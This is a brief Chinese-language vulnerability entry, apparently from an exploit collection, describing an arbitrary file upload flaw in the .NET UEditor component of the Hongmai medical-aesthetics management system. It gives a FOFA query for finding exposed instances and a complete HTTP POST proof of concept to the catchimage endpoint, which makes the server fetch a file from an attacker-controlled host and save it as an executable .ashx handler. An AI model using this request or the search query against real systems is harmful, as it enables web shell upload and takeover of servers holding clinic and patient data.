## 宏脉医美行业管理系统UEditor编辑器存在文件上传漏洞

宏脉医美行业管理系统是由宏脉信息技术（广州）股份有限公司开发的一款服务于医美行业管理服务的系统.宏脉医美行业管理系统使用了UEditor编辑器，Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php,jsp,asp版本不受此UEditor的漏洞的影响，.net存在任意文件上传，绕过文件格式的限制，在获取远程资源的时候并没有对远程文件的格式进行严格的过滤与判断。

## fofa

```
title="宏脉医美行业管理系统"
```

## poc

```
POST /content/Js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: null
Connection: close
Cookie: ASP.NET_SessionId=mzare1hg1ewzaxhakacjhfo0
Upgrade-Insecure-Requests: 1

source[]=http://vpsip/1.png?.ashx
```

